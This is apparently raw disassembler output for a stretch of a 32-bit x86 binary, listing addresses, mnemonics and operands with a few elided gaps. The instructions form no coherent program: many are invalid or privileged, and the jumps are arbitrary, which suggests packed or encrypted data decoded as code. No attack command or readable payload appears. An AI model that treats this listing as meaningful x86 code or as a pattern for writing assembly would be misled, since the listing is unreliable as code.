  4295df:	fimul  DWORD PTR [edx]
  4295e1:	rol    DWORD PTR [eax-0x4b],cl
  4295e4:	sbb    al,al
  4295e6:	repz stc 
  4295e8:	inc    ecx
  4295e9:	jae    0x429629
  4295eb:	lods   al,BYTE PTR ds:[esi]
  4295ec:	bound  esi,QWORD PTR [esi+ebp*1]
  4295ef:	cmp    eax,0x4cccd543
  4295f4:	push   esi
  4295f5:	mov    esi,0x6ba0111d
  4295fa:	xor    al,0xdf
  4295fc:	xchg   esi,eax
  4295fd:	pop    ss
  4295fe:	ja     0x4295e1
  429600:	jmp    0x9715ad23
  429605:	shr    BYTE PTR [ebx+eax*4],cl
  429608:	lods   eax,DWORD PTR ds:[esi]
  429609:	outs   dx,DWORD PTR ds:[esi]
  42960a:	jo     0x4295f5
  42960c:	mov    edi,0x69971314
  429611:	dec    ebx
  429612:	lds    esi,FWORD PTR [eax-0x1158ade8]
  429618:	sub    DWORD PTR ds:[ebp+esi*8-0x131c28bb],edi
  429620:	or     ecx,DWORD PTR [ebp-0x7a653e04]
  429626:	in     eax,0x4b
  429628:	pop    es
  429629:	pop    ds
  42962a:	jbe    0x42963b
  42962c:	jg     0x42963e
  42962e:	fisttp QWORD PTR [edi+0x5835a9d9]
  429634:	jl     0x42962b
  429636:	mov    bh,0x4f
  429638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429639:	push   0x862621ee
  42963e:	push   0x48
  429640:	inc    esp
  429641:	stos   BYTE PTR es:[edi],al
  429642:	push   0x87800781
  429647:	idiv   esp
  429649:	repz push 0x14
  42964c:	and    edx,edx
  42964e:	fimul  WORD PTR [esi+0x31]
  429651:	jmp    0x46baa335
  429656:	in     eax,dx
  429657:	cmp    al,0x4f
  429659:	test   BYTE PTR [ebx],cl
  42965b:	repz pushf 
  42965d:	cmp    bh,dl
  42965f:	sub    BYTE PTR [eax],bh
  429661:	dec    ebx
  429662:	pop    esp
  429663:	cmp    DWORD PTR [ebp+0x1c9523d9],esi
  429669:	dec    ecx
  42966a:	aad    0x27
  42966c:	and    eax,0xed
	...
  4296d5:	add    BYTE PTR [ebp+0x1d],ch
  4296d8:	out    0xc0,al
  4296da:	idiv   bl
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	jns    0x429721
  4296e4:	lahf   
  4296e5:	aaa    
  4296e6:	addr16 mov esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	or     BYTE PTR [edi-0x7c],bl
  4296f1:	mov    ah,0x1b
  4296f3:	popa   
  4296f4:	or     dx,sp
  4296f7:	mov    ss,WORD PTR [eax+0x2e]
  4296fa:	add    esi,esi
  4296fc:	push   ecx
  4296fd:	or     bl,BYTE PTR [edx+0x57]
  429700:	mov    ch,dl
  429702:	std    
  429703:	xchg   esi,eax
  429704:	loop   0x4296aa
  429706:	jp     0x42975b
  429708:	shl    ebp,1
  42970a:	imul   esi,edx,0xe73fbd4f
  429710:	stos   DWORD PTR es:[edi],eax
  429711:	xchg   edi,eax
  429712:	aam    0x61
  429714:	iret   
  429715:	mov    dh,0xbd
  429717:	inc    eax
  429718:	out    dx,eax
  429719:	adc    DWORD PTR [ecx],esp
  42971b:	loop   0x4296b2
  42971d:	outs   dx,BYTE PTR ds:[esi]
  42971e:	jo     0x429745
  429720:	sbb    DWORD PTR [esi+0x537b565c],ecx
  429726:	mov    eax,0x275298ef
  42972b:	dec    eax
  42972c:	pop    esi
  42972d:	aas    
  42972e:	cmp    BYTE PTR [ebx],cl
  429730:	jae    0x42972a
  429732:	out    0x4,eax
  429734:	sbb    BYTE PTR [edx],cl
  429736:	sbb    eax,DWORD PTR [ebx+0x8]
  429739:	mov    fs,WORD PTR [ebp-0x512aa62f]
  42973f:	fsub   st,st(7)
  429741:	jmp    0xf0af:0x37399db4
  429748:	xchg   edi,eax
  429749:	jns    0x429782
  42974b:	jp     0x42974b
  42974d:	cmc    
  42974e:	sub    bh,BYTE PTR [edi+0x1e]
  429751:	xchg   DWORD PTR [ecx],ecx
  429753:	mov    al,0x6b
  429755:	gs pop ecx
  429757:	pushf  
  429758:	jg     0x4296e6
  42975a:	mov    al,BYTE PTR [ebp-0x7c2d19ad]
  429760:	shr    BYTE PTR [ebx+0x3f5abcd5],0xcc
  429767:	ins    BYTE PTR es:[edi],dx
  429768:	mov    ecx,0x2dba395e
  42976d:	sahf   
  42976e:	fnstsw WORD PTR [esi+0x16adeb46]
  429774:	xchg   BYTE PTR [ecx-0x3f],dh
  429777:	xor    DWORD PTR [ecx+0x17801f04],edx
  42977d:	jl     0x4297a2
  42977f:	hlt    
  429780:	mov    WORD PTR [edx-0x2e6e1144],ss
  429786:	fwait
  429787:	mov    ebx,0xfe9f1a12
  42978c:	(bad)
  42978f:	inc    edi
  429790:	mov    ch,BYTE PTR [edx+0x219f14ab]
  429796:	sbb    DWORD PTR [ebp+0x4e50e6a],edi
  42979c:	sub    eax,0xb4446786
  4297a1:	addr16 mov ebp,0xaa4f3e97
  4297a7:	adc    BYTE PTR [edx],0x5c
  4297aa:	mov    esi,0x14a24580
  4297af:	retf   0x4099
  4297b2:	xchg   edx,eax
  4297b3:	xor    al,0xc1
  4297b5:	add    ch,al
  4297b7:	add    ecx,DWORD PTR [ebx+0x2d]
  4297ba:	sub    al,0x1f
  4297bc:	mov    al,0xf4
  4297be:	add    dh,BYTE PTR [edi+0x2e75e535]
  4297c4:	neg    ah
  4297c6:	test   BYTE PTR [edx+0x36f40ea8],ch
  4297cc:	mov    edi,0x727eb868
  4297d1:	add    al,0x25
  4297d3:	xor    ah,al
  4297d5:	push   0xab3211e2
  4297da:	push   ecx
  4297db:	test   DWORD PTR [esi],ebp
  4297dd:	call   0x366c:0xab3e7648
  4297e4:	outs   dx,DWORD PTR ds:[esi]
  4297e5:	mov    bh,0xfc
  4297e7:	add    eax,0x278034da
  4297ec:	jnp    0x4297ba
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	or     al,0x53
  429864:	inc    esi
  429865:	mov    ch,0x67
  429867:	mov    ebp,0x1000001
  42986c:	add    BYTE PTR [eax],al
  42986e:	repz inc esp
  429870:	hlt    
  429871:	sub    DWORD PTR [edx-0x14c4c055],edx
  429877:	cmp    DWORD PTR [ecx-0x170b0635],ecx
  42987d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42987e:	daa    
  42987f:	pop    ebp
  429880:	add    DWORD PTR [esi-0x40fb79ec],ebp
  429886:	je     0x429858
  429888:	mov    edx,0x31a419a6
  42988d:	pavgb  mm6,QWORD PTR [edx-0x68316c07]
  429894:	aas    
  429895:	(bad)  [esi]
  429897:	pop    esp
  429898:	xlat   BYTE PTR ds:[ebx]
  429899:	jns    0x4298f1
  42989b:	(bad)
  42989f:	jmp    0xf47b:0x846f12bb
  4298a6:	in     al,0x13
  4298a8:	add    eax,0x9c333694
  4298ad:	xchg   esp,eax
  4298ae:	push   edi
  4298af:	call   0xbd98bfed
  4298b4:	pop    ds
  4298b5:	jns    0x429925
  4298b7:	pusha  
  4298b8:	push   cs
  4298b9:	sar    DWORD PTR [ebx],1
  4298bb:	sti    
  4298bc:	or     edx,DWORD PTR [esi]
  4298be:	and    DWORD PTR [eax],ecx
  4298c0:	xchg   BYTE PTR [esi+edx*8-0x34],al
  4298c4:	(bad)  
  4298c5:	out    dx,eax
  4298c6:	test   al,0xf2
  4298c8:	inc    esp
  4298c9:	xchg   DWORD PTR [esi+0x24e3c8bd],ebx
  4298cf:	rep ins DWORD PTR es:[edi],dx
  4298d1:	fnsave [ebp+0x1cfca018]
  4298d7:	sub    BYTE PTR [esi+0x73],0x33
  4298db:	sub    eax,0x625da834
  4298e0:	int    0x76
  4298e2:	dec    eax
  4298e3:	inc    esp
  4298e4:	mov    dl,0x2
  4298e6:	xlat   BYTE PTR ds:[ebx]
  4298e7:	mov    esp,0xeccdadf5
  4298ec:	jb     0x42995c
  4298ee:	arpl   WORD PTR [edx],cx
  4298f0:	into   
  4298f1:	daa    
  4298f2:	jbe    0x4298fe
  4298f4:	sbb    BYTE PTR ss:[ebx+esi*2],dh
  4298f8:	and    eax,0x1e93f573
  4298fd:	popf   
  4298fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298ff:	adc    bh,0xa9
  429902:	outs   dx,BYTE PTR ds:[esi]
  429903:	lahf   
  429904:	into   
  429905:	ja     0x42994a
  429907:	pusha  
  429908:	popf   
  429909:	dec    esp
  42990a:	xchg   BYTE PTR [esi],bh
  42990c:	fwait
  42990d:	ins    DWORD PTR es:[edi],dx
  42990e:	adc    bh,BYTE PTR [eax-0x1]
  429911:	jne    0x429917
  429913:	mov    dh,dh
  429915:	idiv   esi
  429917:	jns    0x429957
  429919:	cmp    DWORD PTR [edx-0x1e],ecx
  42991c:	mov    esp,0x95dff807
  429921:	js     0x429987
  429923:	pusha  
  429924:	adc    al,0xaf
  429926:	(bad)  
  429927:	cli    
  429928:	or     BYTE PTR ds:0x116bbe0f,0xd7
  42992f:	stos   BYTE PTR es:[edi],al
  429930:	jb     0x429949
  429932:	push   es
  429933:	test   al,0x61
  429935:	or     BYTE PTR [ecx+0x5],ah
  429938:	pusha  
  429939:	call   0x6378:0xab4915cc
  429940:	outs   dx,BYTE PTR ds:[esi]
  429941:	inc    edi
  429942:	add    al,0x8b
  429944:	cmp    DWORD PTR [ebp-0x388223f3],ebx
  42994a:	data16 sar BYTE PTR [ebx],1
  42994d:	es dec esp
  42994f:	addr16 xchg ebx,eax
  429951:	push   ebx
  429952:	repz fdiv st,st(5)
  429955:	pop    ecx
  429956:	push   esp
  429957:	ins    DWORD PTR es:[edi],dx
  429958:	sbb    eax,0xe32ec7bb
  42995d:	mov    BYTE PTR [edi+ebx*4+0x56],al
  429961:	add    al,0x2c
  429963:	stos   DWORD PTR es:[edi],eax
  429964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429965:	inc    esp
  429966:	sbb    DWORD PTR ds:0xf3444f83,ebp
  42996c:	bound  eax,QWORD PTR [eax+eax*1+0x0]
	...
  4299d4:	add    BYTE PTR [eax],al
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	push   ds
  4299e3:	add    DWORD PTR [eax+0x55],0x67
  4299e7:	mov    esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	xchg   esi,eax
  4299ef:	xor    eax,0x11ab49e2
  4299f4:	xchg   ebp,eax
  4299f5:	mov    eax,0x16afe873
  4299fa:	loop   0x4299a8
  4299fc:	push   cs
  4299fd:	outs   dx,BYTE PTR ds:[esi]
  4299fe:	mov    BYTE PTR [eax+0x7],dl
  429a01:	or     bh,dl
  429a03:	pop    ss
  429a04:	sbb    DWORD PTR [ebx],eax
  429a06:	cmp    al,0xf0
  429a08:	mov    dl,ch
  429a0a:	cdq    
  429a0b:	fstp   DWORD PTR [ebx-0x54]
  429a0e:	jno    0x4299b6
  429a10:	aad    0x88
  429a12:	cmp    al,BYTE PTR [esi+esi*8+0x13]
  429a16:	and    esi,ecx
  429a18:	jp     0x429a1d
  429a1a:	add    DWORD PTR [eax-0x135d49f1],0x3e
  429a21:	add    edi,ebp
  429a23:	pop    es
  429a24:	xchg   ecx,eax
  429a25:	test   eax,0x5f17810d
  429a2a:	inc    eax
  429a2b:	mov    ecx,0x5cd7acdf
  429a30:	icebp  
  429a31:	or     al,0x91
  429a33:	scas   al,BYTE PTR es:[edi]
  429a34:	inc    DWORD PTR [esi-0x56]
  429a37:	(bad)  
  429a38:	neg    BYTE PTR [ebp-0x7]
  429a3b:	fbld   TBYTE PTR ss:[eax]
  429a3e:	and    DWORD PTR [edi],ebx
  429a40:	pop    ecx
  429a41:	or     BYTE PTR [ecx],cl
  429a43:	jg     0x429a24
  429a45:	pushf  
  429a46:	jle    0x429a1a
  429a48:	xchg   BYTE PTR [edi-0x47],bl
  429a4b:	or     dl,ah
  429a4d:	mov    dl,0x81
  429a4f:	lods   al,BYTE PTR ds:[esi]
  429a50:	sar    BYTE PTR [ebx],cl
  429a52:	or     DWORD PTR [eax-0x80],eax
  429a55:	test   ecx,edx
  429a57:	test   BYTE PTR [esi],dh
  429a59:	xchg   edi,eax
  429a5a:	outs   dx,DWORD PTR ds:[esi]
  429a5b:	add    al,0xc0
  429a5d:	mov    esi,0x5fd2167d
  429a62:	clc    
  429a63:	pmulhuw mm0,QWORD PTR [eax-0x12]
  429a67:	jmp    0x429ad0
  429a69:	aad    0x45
  429a6b:	enter  0x5214,0x92
  429a6f:	ret    
  429a70:	call   0x9db9:0xd849f9dc
  429a77:	cmp    eax,0x81d27490
  429a7c:	sbb    eax,0xb1725d34
  429a81:	mov    dl,BYTE PTR [ebx-0x7a]
  429a84:	xor    al,0xcc
  429a86:	cld    
  429a87:	add    BYTE PTR [eax],bh
  429a89:	xor    al,0xed
  429a8b:	dec    edi
  429a8c:	xchg   ebp,eax
  429a8d:	mov    eax,ds:0xa52563d3
  429a92:	inc    ebp
  429a93:	xlat   BYTE PTR ds:[ebx]
  429a94:	or     esi,0xffffff8c
  429a97:	retf   
  429a98:	fsubr  QWORD PTR [esi]
  429a9a:	lahf   
  429a9b:	fistp  QWORD PTR [edi-0x26ac883f]
  429aa1:	and    al,0x62
  429aa3:	leave  
  429aa4:	fs dec ecx
  429aa6:	sbb    edi,DWORD PTR [edx]
  429aa8:	pop    edx
  429aa9:	aad    0x52
  429aab:	jg     0x429a7c
  429aad:	cmp    BYTE PTR [edx],0x32
  429ab0:	lea    ebp,[edx-0x73bb10a0]
  429ab6:	je     0x429a7c
  429ab8:	and    ebp,DWORD PTR [ecx-0x5b]
  429abb:	sub    ch,BYTE PTR [esi+0x62]
  429abe:	cmp    ch,BYTE PTR [esi]
  429ac0:	aaa    
  429ac1:	push   esp
  429ac2:	in     al,0xe2
  429ac4:	mov    edx,0x29caa67a
  429ac9:	mov    ?,edx
  429acb:	sub    DWORD PTR [ecx+0x2e],0xffffffaa
  429acf:	call   0x4144099f
  429ad4:	scas   al,BYTE PTR es:[edi]
  429ad5:	dec    esp
  429ad6:	or     al,0xe4
  429ad8:	(bad)  
  429ad9:	adc    eax,0x195a55a0
  429ade:	mov    bl,0xaf
  429ae0:	pushf  
  429ae1:	xchg   BYTE PTR [ebx+0x21],dh
  429ae4:	sub    eax,0x48b7d4a0
  429ae9:	out    dx,eax
  429aea:	test   ch,al
  429aec:	jl     0x429a99
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x5a95667
  429b63:	scas   eax,DWORD PTR es:[edi]
  429b64:	fwait
  429b65:	cld    
  429b66:	addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	stos   DWORD PTR es:[edi],eax
  429b6f:	xchg   esi,eax
  429b70:	pop    ds
  429b71:	xor    eax,esi
  429b73:	enter  0xaade,0x6e
  429b77:	jae    0x429bdc
  429b79:	pop    ss
  429b7a:	popf   
  429b7b:	dec    edx
  429b7c:	push   cs
  429b7d:	stos   DWORD PTR es:[edi],eax
  429b7e:	loope  0x429baf
  429b80:	mov    cl,0x87
  429b82:	or     BYTE PTR ds:0x85148d95,ch
  429b88:	mov    esp,0x59249bdc
  429b8d:	(bad)
  429b91:	inc    eax
  429b92:	xor    DWORD PTR [ecx+0x3b],edx
  429b95:	sub    ah,ah
  429b97:	imul   ebp,DWORD PTR [edi],0xa9838dd8
  429b9d:	jecxz  0x429b9b
  429b9f:	sub    esp,0x59
  429ba2:	jge    0x429b4f
  429ba4:	loope  0x429bcc
  429ba6:	pop    edi
  429ba7:	imul   esi,DWORD PTR [edx+0x4ab0199f],0xa6e3066a
  429bb1:	leave  
  429bb2:	mov    esp,0x3b1de409
  429bb8:	(bad)  
  429bb9:	repz sbb eax,0xb8b90046
  429bbf:	and    esp,0x95db7844
  429bc5:	pushf  
  429bc6:	or     al,0xd9
  429bc8:	jp     0x429c32
  429bca:	adc    DWORD PTR ds:0x27cf759d,0xe6e2770c
  429bd4:	adc    al,BYTE PTR ds:0xcc2b83e7
  429bda:	push   DWORD PTR [esi-0x31]
  429bdd:	or     al,dh
  429bdf:	dec    ebx
  429be0:	mov    eax,0x8f661fd2
  429be5:	mov    ecx,0x4edba4a
  429bea:	sar    bh,0x80
  429bed:	push   0x37
  429bef:	sbb    DWORD PTR [eax+0x36],eax
  429bf2:	cli    
  429bf3:	sar    BYTE PTR [ecx-0x4b92913],cl
  429bf9:	sbb    BYTE PTR [ebp+0x50],al
  429bfc:	or     BYTE PTR [eax-0x16],0x8e
  429c00:	mov    edi,0x7088f6a9
  429c05:	cmp    cl,BYTE PTR [esi]
  429c07:	(bad)  
  429c09:	sub    dl,al
  429c0b:	mov    ds:0x3d28b389,al
  429c10:	out    0x2f,al
  429c12:	xor    BYTE PTR [ecx+0x60dcc2e1],al
  429c18:	test   bh,0x71
  429c1b:	mov    al,fs:0x4fd20591
  429c21:	sbb    al,0x82
  429c23:	xchg   esp,eax
  429c24:	and    al,0x4f
  429c26:	es lock pop edi
  429c29:	jo     0x429c80
  429c2b:	mov    cl,0x81
  429c2d:	cwde   
  429c2e:	and    ebx,0xa172bb60
  429c34:	mov    eax,DWORD PTR [ebp+0x25]
  429c37:	dec    ebx
  429c38:	pop    edx
  429c39:	in     eax,0x1
  429c3b:	xchg   ebp,eax
  429c3c:	mov    BYTE PTR ds:0x9ac81ff9,dh
  429c42:	jmp    0xbff9:0xb2281ed5
  429c49:	push   eax
  429c4a:	fnstcw WORD PTR [eax]
  429c4c:	or     bl,0x2e
  429c4f:	mov    bh,0xdb
  429c51:	lods   eax,DWORD PTR ds:[esi]
  429c52:	out    dx,al
  429c53:	pushf  
  429c54:	and    eax,0xa942a8f5
  429c59:	int    0x97
  429c5b:	push   ss
  429c5c:	xchg   edi,eax
  429c5d:	jmp    0x429bf4
  429c5f:	arpl   WORD PTR [ebx],cx
  429c61:	jl     0x429be6
  429c63:	pop    ss
  429c64:	adc    DWORD PTR [ecx+ebp*8-0x15],ecx
  429c68:	scas   al,BYTE PTR es:[edi]
  429c69:	jecxz  0x429c6c
  429c6b:	mov    eax,0xc444
	...
  429cd4:	add    BYTE PTR [eax],al
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    dl,bh
  429ce3:	push   esp
  429ce4:	call   0x0:0x1c06732
  429ceb:	add    DWORD PTR [eax],eax
  429ced:	add    BYTE PTR [esi+eax*2-0x51d415ff],cl
  429cf4:	inc    edi
  429cf5:	xchg   ebp,eax
  429cf6:	xchg   esp,eax
  429cf7:	pop    esp
  429cf8:	dec    ebx
  429cf9:	pop    es
  429cfa:	inc    eax
  429cfb:	stc    
  429cfc:	cmc    
  429cfd:	pop    ebp
  429cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cff:	mov    DWORD PTR [ebp-0x44],ebx
  429d02:	xchg   ebx,eax
  429d03:	or     bl,BYTE PTR [edi+0x14]
  429d06:	test   al,0x6d
  429d08:	mov    ds:0xaa5e0643,eax
  429d0d:	sub    DWORD PTR [edx],ecx
  429d0f:	or     eax,0xb357b76
  429d14:	scas   al,BYTE PTR es:[edi]
  429d15:	sbb    edx,DWORD PTR [eax]
  429d17:	push   ebx
  429d18:	xchg   edx,eax
  429d19:	pop    esp
  429d1a:	pop    ebx
  429d1b:	jmp    0x4661f8b6
  429d20:	jns    0x429d87
  429d22:	retf   
  429d23:	aaa    
  429d24:	mov    cl,ch
  429d26:	xchg   edx,eax
  429d27:	test   edi,esi
  429d29:	inc    esp
  429d2a:	sub    eax,0x96310813
  429d2f:	fidivr WORD PTR [ebx-0x1b]
  429d32:	jno    0x429ceb
  429d34:	lahf   
  429d35:	push   edi
  429d36:	sub    eax,0xe7608433
  429d3b:	lods   al,BYTE PTR ds:[esi]
  429d3c:	in     al,0x68
  429d3e:	add    ah,BYTE PTR [ecx+0x466b464a]
  429d44:	jb     0x429dc4
  429d46:	shl    DWORD PTR [ebx-0x4e],cl
  429d49:	inc    ebx
  429d4a:	fstp   DWORD PTR [ebp+eiz*1+0x1d]
  429d4e:	mov    esi,DWORD PTR [esi-0x2f]
  429d51:	pop    esi
  429d52:	retf   0xf0bf
  429d55:	jecxz  0x429d50
  429d57:	or     cl,bh
  429d59:	cwde   
  429d5a:	mov    bh,0xe5
  429d5c:	je     0x429d24
  429d5e:	dec    ecx
  429d5f:	test   eax,esp
  429d61:	push   ss
  429d62:	push   esp
  429d63:	sub    eax,0xb3325c11
  429d68:	push   ds
  429d69:	ficomp DWORD PTR [ebp+0x6d]
  429d6c:	ret    
  429d6d:	jle    0x429d46
  429d6f:	inc    eax
  429d70:	lds    ecx,FWORD PTR [esi-0x48feec3c]
  429d76:	cli    
  429d77:	add    edx,DWORD PTR ds:0xb2aa44bd
  429d7d:	ds or  al,0xec
  429d80:	sub    eax,0x57438379
  429d85:	mov    ds:0xb64a7d4e,al
  429d8a:	jmp    FWORD PTR [eax-0x73a92a31]
  429d90:	out    0x65,eax
  429d92:	icebp  
  429d93:	scas   eax,DWORD PTR es:[edi]
  429d94:	mov    edi,0xc665ff1e
  429d99:	jmp    0x62ba135f
  429d9e:	inc    eax
  429d9f:	and    BYTE PTR [esi-0xb08d006],dh
  429da5:	or     eax,0x12680bd9
  429daa:	xchg   ecx,eax
  429dab:	and    ah,al
  429dad:	call   0x9367:0xbc613cec
  429db4:	fwait
  429db5:	mov    edx,0xc109457f
  429dba:	sub    esi,ecx
  429dbc:	add    dl,dl
  429dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429dbf:	jl     0x429d64
  429dc1:	ret    
  429dc2:	cli    
  429dc3:	inc    eax
  429dc4:	arpl   WORD PTR [eax-0x6d],bx
  429dc7:	xor    DWORD PTR [edx-0x33e1bcaa],edi
  429dcd:	or     al,0x4d
  429dcf:	lahf   
  429dd0:	rcr    BYTE PTR ds:0x6aee7752,1
  429dd6:	mov    cs,WORD PTR [eax+0x57542024]
  429ddc:	lods   eax,DWORD PTR ds:[esi]
  429ddd:	inc    edi
  429dde:	neg    BYTE PTR [esi-0x54]
  429de1:	punpckhwd mm7,QWORD PTR fs:[esi+0x7f]
  429de6:	mov    BYTE PTR [ebx],ch
  429de8:	dec    esp
  429de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429dea:	out    dx,eax
  429deb:	pop    edi
  429dec:	sub    eax,0x4b
	...
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	sbb    ebx,ebp
  429e64:	ja     0x429e30
  429e66:	rol    DWORD PTR [bx+di],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	inc    edi
  429e6f:	loopne 0x429ed7
  429e71:	hlt    
  429e72:	jae    0x429e85
  429e74:	(bad)  
  429e75:	xchg   esi,eax
  429e76:	xlat   BYTE PTR ds:[ebx]
  429e77:	mov    esp,0x2f2fb86b
  429e7c:	clc    
  429e7d:	lock xchg BYTE PTR [ecx],al
  429e80:	lds    ebp,FWORD PTR [esi+0x7fff997f]
  429e86:	push   edi
  429e87:	sub    edx,edi
  429e89:	mov    ebp,0xb91e7d7b
  429e8e:	sbb    ch,cl
  429e90:	mov    edx,DWORD PTR [edi]
  429e92:	or     esi,DWORD PTR [ecx-0x319eb57b]
  429e98:	and    eax,0x2e0a143
  429e9d:	xchg   edi,eax
  429e9e:	or     eax,0x10c3dd92
  429ea3:	mov    dl,0xc6
  429ea5:	mov    eax,0xbc03aff
  429eaa:	or     DWORD PTR [ebp+0x7242669],esi
  429eb0:	or     eax,0xf9e0c343
  429eb5:	lods   eax,DWORD PTR ds:[esi]
  429eb6:	out    dx,al
  429eb7:	adc    DWORD PTR [eax],ebp
  429eb9:	ins    DWORD PTR es:[edi],dx
  429eba:	mov    dl,0xde
  429ebc:	stc    
  429ebd:	mov    bl,0x85
  429ebf:	pop    ebx
  429ec0:	xor    bh,al
  429ec2:	pop    ebp
  429ec3:	jp     0x429f01
  429ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ec6:	mov    dl,0x90
  429ec8:	mov    dl,0x8d
  429eca:	adc    DWORD PTR [ebx],esp
  429ecc:	clc    
  429ecd:	sbb    dh,BYTE PTR [ebx]
  429ecf:	shl    ah,cl
  429ed1:	outs   dx,DWORD PTR ds:[esi]
  429ed2:	aad    0xe
  429ed4:	adc    BYTE PTR [edx+0x48],bl
  429ed7:	jae    0x429f4d
  429ed9:	mov    ah,0xee
  429edb:	pop    ebp
  429edc:	ret    0x3c17
  429edf:	loopne 0x429f12
  429ee1:	call   0xae15:0xdc71c77c
  429ee8:	shl    BYTE PTR [edx],0x89
  429eeb:	mov    edi,DWORD PTR [ebp-0x6]
  429eee:	or     DWORD PTR [edi],esp
  429ef0:	clc    
  429ef1:	mov    WORD PTR [ecx-0x7b9cefae],ss
  429ef7:	sub    bh,BYTE PTR [ebx+0x271b58e9]
  429efd:	fisubr DWORD PTR [edx]
  429eff:	or     BYTE PTR [ecx+0x3c],bl
  429f02:	dec    esp
  429f03:	and    DWORD PTR [esi-0x10b17e6d],0x47
  429f0a:	sbb    al,0x6a
  429f0c:	mov    ds:0xe59be5da,eax
  429f11:	in     eax,dx
  429f12:	bound  ecx,QWORD PTR [ecx-0x7b57b88f]
  429f18:	bound  ebx,QWORD PTR [edx-0x58]
  429f1b:	sbb    ebp,DWORD PTR [esp+edx*8]
  429f1e:	(bad)  
  429f20:	lahf   
  429f21:	jbe    0x429eaf
  429f23:	dec    ebp
  429f24:	out    0xbd,eax
  429f26:	cmp    al,0x88
  429f28:	fs mov bl,0x94
  429f2b:	fcomi  st,st(1)
  429f2d:	sahf   
  429f2e:	das    
  429f2f:	mov    bl,BYTE PTR [edi]
  429f31:	das    
  429f32:	aam    0x9d
  429f34:	in     eax,dx
  429f35:	mov    bl,0x66
  429f37:	push   ebp
  429f38:	mov    esi,0x86ef1ebf
  429f3d:	(bad)
  429f41:	cmp    edx,edx
  429f43:	jle    0x429f5c
  429f45:	data16 sub cl,BYTE PTR [eax]
  429f48:	cs cs (bad) 
  429f4b:	adc    esp,edi
  429f4d:	retf   
  429f4e:	xchg   edx,eax
  429f4f:	ja     0x429f4b
  429f51:	lods   eax,DWORD PTR ds:[esi]
  429f52:	cmp    al,0xee
  429f54:	cmp    dl,BYTE PTR ds:0x831ee559
  429f5a:	outs   dx,DWORD PTR ds:[esi]
  429f5b:	add    edi,0xffffffd5
  429f5e:	(bad)  
  429f5f:	pushf  
  429f60:	xchg   ebp,eax
  429f61:	mov    eax,ds:0xdb25165e
  429f66:	mov    ?,esp
  429f68:	dec    eax
  429f69:	pop    edx
  429f6a:	aam    0x7a
  429f6c:	test   eax,0xdd
	...
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x22b67bd6]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	jnp    0x429fc5
  429ff0:	xchg   ecx,eax
  429ff1:	rcr    DWORD PTR [edx],0x4e
  429ff4:	je     0x42a055
  429ff6:	call   0xaaba:0x7da33c12
  429ffd:	push   ecx
  429ffe:	pop    ecx
  429fff:	pop    edi
  42a000:	jnp    0x42a03e
  42a002:	cmp    al,0xbe
  42a004:	outs   dx,DWORD PTR ds:[esi]
  42a005:	mov    cl,0x99
  42a007:	inc    ebp
  42a008:	inc    edx
  42a009:	pop    edi
  42a00a:	stc    
  42a00b:	rcr    BYTE PTR [ecx],cl
  42a00d:	inc    eax
  42a00e:	mov    dl,0x59
  42a010:	xchg   edx,eax
  42a011:	jnp    0x42a087
  42a013:	sbb    DWORD PTR [esi],esi
  42a015:	fild   DWORD PTR [eax]
  42a017:	jg     0x429fef
  42a019:	ins    BYTE PTR es:[edi],dx
  42a01a:	xor    DWORD PTR [esi+0x1aac0161],eax
  42a020:	pop    edi
  42a021:	stos   DWORD PTR es:[edi],eax
  42a022:	cdq    
  42a023:	call   0x623fdb6d
  42a028:	inc    eax
  42a029:	or     al,0x6e
  42a02b:	shl    BYTE PTR [edi],cl
  42a02d:	xlat   BYTE PTR ds:[ebx]
  42a02e:	int3   
  42a02f:	sub    eax,0xea28bb88
  42a034:	lds    ecx,FWORD PTR [edx+0x3753f20b]
  42a03a:	push   0xffffffa1
  42a03c:	jle    0x429fc8
  42a03e:	cs dec esi
  42a040:	inc    ebx
  42a041:	sub    eax,0x12a2975e
  42a046:	xor    al,0xe0
  42a048:	(bad)  
  42a049:	mov    edx,0xd7d18516
  42a04e:	xchg   ecx,eax
  42a04f:	retf   0xaae1
  42a052:	add    BYTE PTR [ecx+0x1b],bl
  42a055:	aas    
  42a056:	out    0x64,al
  42a058:	imul   ecx,DWORD PTR [eax+eiz*4+0x7828323c],0x325c61ac
  42a063:	push   ss
  42a064:	mov    ah,0xb5
  42a066:	fdiv   QWORD PTR [ecx+0x4201dfb0]
  42a06c:	shl    BYTE PTR [eax],0xd9
  42a06f:	mov    ds:0x83e66b05,al
